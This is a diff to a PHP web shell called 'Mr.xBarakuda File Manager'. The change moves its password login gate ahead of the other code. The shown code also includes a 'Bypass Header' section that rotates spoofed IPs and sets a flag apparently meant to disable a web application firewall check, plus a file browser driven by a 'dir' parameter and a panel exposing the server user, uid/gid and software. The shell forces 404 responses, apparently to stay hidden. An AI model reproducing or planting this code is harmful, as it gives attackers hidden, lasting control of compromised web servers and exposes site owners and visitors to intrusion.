@@ -14,6 +14,53 @@ if (function_exists('ob_start')) {
 @header("X-Accel-Buffering: no");
 @header("Content-Encoding: none");
 @http_response_code(404);
+session_start();
+$xk = '$2y$10$vHZY4ffk9xgETHMK8RqPX.QUX1CLfOVeHJ91YihlX1Wu2r/v.n3nC';
+if (isset($_POST['pass'])) {
+  if (password_verify($_POST['pass'], $xk)) {
+    $_SESSION['auth_xbarakuda'] = true;
+  }
+}
+if (isset($_GET['logout'])) {
+  unset($_SESSION['auth_xbarakuda']);
+  header("Location: ?");
+  exit;
+}
+$isLoggedIn = isset($_SESSION['auth_xbarakuda']) && $_SESSION['auth_xbarakuda'] === true;
+if (!$isLoggedIn):
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?php echo $_SERVER['SERVER_NAME']; ?></title>
+    <style>
+        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
+        .login-box { max-width: 300px; margin: 100px auto; padding: 20px; border: 1px solid #00ff00; }
+        input { background-color: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; width: 90%; }
+        button { background-color: #00ff00; color: #000; border: none; padding: 6px 15px; margin-top: 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box" id="login-form">
+        <h3>Mr.xBarakuda File Manager</h3>
+        <form method="post">
+            <label>Your IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></label>
+            <br>
+            <input type="password" name="pass" placeholder="Welcome Master!">
+            <br>
+            <button type="submit">Akses</button>
+        </form>
+        <?php if (isset($_POST['pass'])): ?>
+            <script>alert("Masukin password yang bener kocak!");window.location.href='http://cdn0-production-images-kly.akamaized.net/TyDuDZmA9bwrigAdcN7SrXjNbhI=/640x360/smart/filters:quality(75):strip_icc():format(jpeg)/kly-media-production/medias/2320361/original/073129300_1533536676-b4f9ae50-4a5a-45ea-b775-3bfe10012338-large16x9_37027095_117574199161766_2629077514856693760_n.jpg';</script>
+        <?php endif; ?>
+    </div>
+</body>
+</html>
+<?php
+exit;
+endif;
 // Bypass Header by Mr.xBarakuda
 $ipRotations = ['192.0.2.10', '198.51.100.23', '203.0.113.45', '203.0.113.46', '198.51.100.24'];
 $selectedIp = $ipRotations[array_rand($ipRotations)];
@@ -92,54 +139,6 @@ if (isset($_SERVER['HTTP_X_WEB_FACTOR']) && stripos($_SERVER['HTTP_X_WEB_FACTOR'
     define('PHP_PHP_COMPAT', 'disable_php_waf_check');
   }
 }
-session_start();
-$xk = '$2y$10$vHZY4ffk9xgETHMK8RqPX.QUX1CLfOVeHJ91YihlX1Wu2r/v.n3nC';
-if (isset($_POST['pass'])) {
-  if (password_verify($_POST['pass'], $xk)) {
-    $_SESSION['auth_xbarakuda'] = true;
-  }
-}
-if (isset($_GET['logout'])) {
-  unset($_SESSION['auth_xbarakuda']);
-  header("Location: ?");
-  exit;
-}
-$isLoggedIn = isset($_SESSION['auth_xbarakuda']) && $_SESSION['auth_xbarakuda'] === true;
-if (!$isLoggedIn):
-?>
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?php echo $_SERVER['SERVER_NAME']; ?></title>
-    <style>
-        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
-        .login-box { max-width: 300px; margin: 100px auto; padding: 20px; border: 1px solid #00ff00; }
-        input { background-color: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; width: 90%; }
-        button { background-color: #00ff00; color: #000; border: none; padding: 6px 15px; margin-top: 10px; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <div class="login-box" id="login-form">
-        <h3>Mr.xBarakuda File Manager</h3>
-        <form method="post">
-            <label>Your IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></label>
-            <br>
-            <input type="password" name="pass" placeholder="Welcome Master!">
-            <br>
-            <button type="submit">Akses</button>
-        </form>
-        <?php if (isset($_POST['pass'])): ?>
-            <script>alert("Masukin password yang bener kocak!");window.location.href='http://cdn0-production-images-kly.akamaized.net/TyDuDZmA9bwrigAdcN7SrXjNbhI=/640x360/smart/filters:quality(75):strip_icc():format(jpeg)/kly-media-production/medias/2320361/original/073129300_1533536676-b4f9ae50-4a5a-45ea-b775-3bfe10012338-large16x9_37027095_117574199161766_2629077514856693760_n.jpg';</script>
-        <?php endif; ?>
-    </div>
-</body>
-</html>
-<?php
-exit;
-endif;
-//
 function getCurrentDirectory() {
     $dir = getcwd();
     if (isset($_GET['dir']) && !empty($_GET['dir'])) {
@@ -589,7 +588,7 @@ if (!file_exists($currentDirectory . '/.htaccess')) {
                     <div class="flex justify-between"><span class="text-slate-500">Software:</span> <span class="text-slate-300"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span></div>
                     <div class="flex justify-between"><span class="text-slate-500">Admin:</span> <span class="text-slate-300"><?php echo $_SERVER['SERVER_ADMIN']; ?></span></div>
                     <div class="flex justify-between"><span class="text-slate-500">IP Address:</span> <span class="text-slate-300 font-mono"><?php echo $_SERVER['SERVER_ADDR']; ?></span></div>
-                    <div class="flex justify-between"><span class="text-slate-500">User:</span> <span class="text-amber-400"><?php echo get_current_user(); ?> (<?php echo getmyuid(); ?>:<?php echo getmygid(); ?>)</span></div>
+                    <div class="flex justify-between"><span class="text-slate-500">User:</span> <span class="text-amber-400"><?php echo get_current_user(); ?> (<?php echo getmyuid(); ?> : <?php echo getmygid(); ?>)</span></div>
                     <div class="flex justify-between"><span class="text-slate-500">Domains:</span> <span class="text-emerald-400 font-mono"><?php echo $domainCount; ?></span></div>
                 </div>
             </div>
